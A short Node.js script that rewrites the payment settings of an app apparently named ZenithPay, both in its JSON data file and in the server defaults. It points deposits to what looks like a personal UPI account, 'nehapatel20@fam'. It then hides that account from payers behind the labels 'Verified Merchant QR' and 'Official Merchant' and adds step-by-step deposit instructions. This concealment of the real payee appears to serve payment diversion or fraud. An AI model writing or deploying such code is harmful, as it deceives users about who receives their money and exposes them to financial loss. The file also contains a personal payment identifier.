const fs = require('fs');

// 1. Update .data/zenithpay_db.json
const dbPath = '.data/zenithpay_db.json';
if (fs.existsSync(dbPath)) {
  const dbData = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
  dbData.settings = dbData.settings || {};
  dbData.settings.upiId = 'nehapatel20@fam';
  dbData.settings.displayUpiId = 'Verified Merchant QR';
  dbData.settings.merchantName = 'Official Merchant';
  dbData.settings.useStaticQr = false;
  dbData.settings.paymentInstructions =
    '1. Scan the QR code using any UPI app (PhonePe, GPay, Paytm, Navi, BHIM) to pay securely.\n2. Complete payment directly on your scanner.\n3. Copy the 12-digit UPI UTR / Reference number from your app.\n4. Enter the UTR number and click Submit Deposit Request.';
  dbData.settings.updatedAt = new Date().toISOString();
  fs.writeFileSync(dbPath, JSON.stringify(dbData, null, 2));
  console.log('Updated .data/zenithpay_db.json with nehapatel20@fam');
}

// 2. Update server/db.ts defaults
let dbTs = fs.readFileSync('server/db.ts', 'utf8');
dbTs = dbTs.replace(/upiId:\s*['"][^'"]+['"]/g, "upiId: 'nehapatel20@fam'");
dbTs = dbTs.replace(/displayUpiId:\s*['"][^'"]+['"]/g, "displayUpiId: 'Verified Merchant QR'");
fs.writeFileSync('server/db.ts', dbTs);
console.log('Updated server/db.ts defaults with nehapatel20@fam');
